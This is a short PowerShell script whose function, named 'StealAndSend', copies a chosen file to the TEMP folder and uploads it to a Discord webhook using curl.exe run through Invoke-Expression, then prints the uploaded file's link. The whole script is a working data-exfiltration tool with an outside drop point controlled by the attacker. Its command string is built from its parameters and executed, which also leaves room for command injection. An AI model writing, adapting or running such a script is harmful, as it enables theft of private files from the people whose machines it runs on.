param (
    [string]$FileSource,
    [string]$WebhookUrl
)

function StealAndSend {
    param (
        [string]$FileSource,
        [string]$WebhookUrl
    )

    function Say($msg, $color="White") {
        Write-Host "» $msg" -ForegroundColor $color
    }

    if (!(Test-Path $FileSource)) {
        Say "File not found: $FileSource" "Red"
        exit 1
    }

    $fileName = [System.IO.Path]::GetFileName($FileSource)
    $tempFile = "$env:TEMP\$fileName"
    Copy-Item $FileSource $tempFile -Force

    Say "Uploading '$fileName' to Discord..." "Yellow"

    $curlCmd = "curl.exe -s -X POST -F file=@`"$tempFile`" `"$WebhookUrl`""
    $result = Invoke-Expression $curlCmd

    if ($LASTEXITCODE -ne 0 -or !$result) {
        Say "Upload failed. curl.exe returned exit code $LASTEXITCODE" "Red"
        exit 1
    }

    try {
        $json = $result | ConvertFrom-Json
        $attachment = $json.attachments[0]

        Say "✅ Upload Successful" "Green"
        Say "📄 File: $($attachment.filename)" "Cyan"
        Say "📦 Size: $([math]::Round($attachment.size / 1024, 2)) KB" "Cyan"
        Say "🔗 Link: $($attachment.url)" "Cyan"
    } catch {
        Say "Upload returned data, but parsing failed." "Red"
        Say $result "DarkGray"
        exit 1
    }
}

StealAndSend -FileSource $FileSource -WebhookUrl $WebhookUrl
